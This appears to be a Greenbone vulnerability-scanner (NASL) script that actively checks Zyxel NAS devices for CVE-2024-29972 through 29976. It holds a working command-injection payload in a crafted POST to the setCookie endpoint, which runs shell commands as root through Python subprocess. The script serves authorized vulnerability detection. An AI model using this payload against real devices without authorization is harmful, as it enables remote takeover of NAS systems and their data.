# SPDX-FileCopyrightText: 2024 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# e.g.:
# cpe:/o:zyxel:nas326_firmware
# cpe:/o:zyxel:nsa-220_plus_firmware
# cpe:/o:zyxel:nsa310s_firmware
#
# nb:
# - While Zyxel is stating that only NASxxx devices are affected we're still running it against NSA
#   devices as well just to be sure (e.g. some of the older not mentioned devices might be affected
#   the same way)
# - There is also cpe:/o:zyxel:nr... or cpe:/o:zyxel:nxc... which seems to be non-NAS devices. If
#   this is ever a problem (if e.g. a router and a NAS is detected on the same host) we could extend
#   get_app_port_from_cpe_prefix() to support a regex
#
CPE_PREFIX = "cpe:/o:zyxel:n";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.152360");
  script_version("2025-05-16T05:40:21+0000");
  script_tag(name:"last_modification", value:"2025-05-16 05:40:21 +0000 (Fri, 16 May 2025)");
  script_tag(name:"creation_date", value:"2024-06-06 05:02:27 +0000 (Thu, 06 Jun 2024)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-06-04 02:15:48 +0000 (Tue, 04 Jun 2024)");

  script_cve_id("CVE-2024-29972", "CVE-2024-29973", "CVE-2024-29974", "CVE-2024-29975",
                "CVE-2024-29976");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Zyxel NAS Multiple Vulnerabilities (Jun 2024) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2024 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_zyxel_nas_http_detect.nasl");
  script_mandatory_keys("zyxel/nas/http/detected");
  script_require_ports("Services/www", 5000);

  script_tag(name:"summary", value:"Multiple Zyxel NAS devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - CVE-2024-29972: Command injection in the CGI program 'remote_help-cgi'

  - CVE-2024-29973: Command injection in the 'setCookie' parameter

  - CVE-2024-29974: Remote code execution (RCE) in the CGI program 'file_upload-cgi'

  - CVE-2024-29975: Improper privilege management in the SUID executable binary

  - CVE-2024-29976: Improper privilege management in the command 'show_allsessions'");

  script_tag(name:"affected", value:"- Zyxel NAS326 version V5.21(AAZF.16)C0 and prior

  - Zyxel NAS542 version V5.21(ABAG.13)C0 and prior

  - Other Zyxel NAS models might be affected as well");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.

  Note: The mentioned NAS products have reached end-of-vulnerability-support.");

  script_xref(name:"URL", value:"https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-multiple-vulnerabilities-in-nas-products-06-04-2024");
  script_xref(name:"URL", value:"https://outpost24.com/blog/zyxel-nas-critical-vulnerabilities/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

cmds = exploit_commands("linux");
vt_strings = get_vt_strings();
bound = vt_strings["default_rand"];

url = "/cmd,/simZysh/register_main/setCookie";

headers = make_array("Content-Type", "multipart/form-data; boundary=" + bound);

foreach pattern (keys(cmds)) {
  data = "--" + bound + '\r\n' +
         'Content-Disposition: form-data; name="c0"\r\n\r\n' +
         'storage_ext_cgi CGIGetExtStoInfo None) and False or ' +
         '__import__("subprocess").check_output("/usr/local/apache/web_framework/bin/executer_su /bin/' +
         cmds[pattern] + '", shell=True)#\r\n' +
         "--" + bound + '--\r\n';

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    info["HTTP Method"] = "POST";
    info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
    info['HTTP "POST" body'] = data;
    info['HTTP "Content-Type" header'] = headers["Content-Type"];

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to execute the "' + cmds[pattern] + '" command on the target host.';
    report += '\n\nResult:\n' + res;
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);
    exit(0);
  }
}

exit(99);
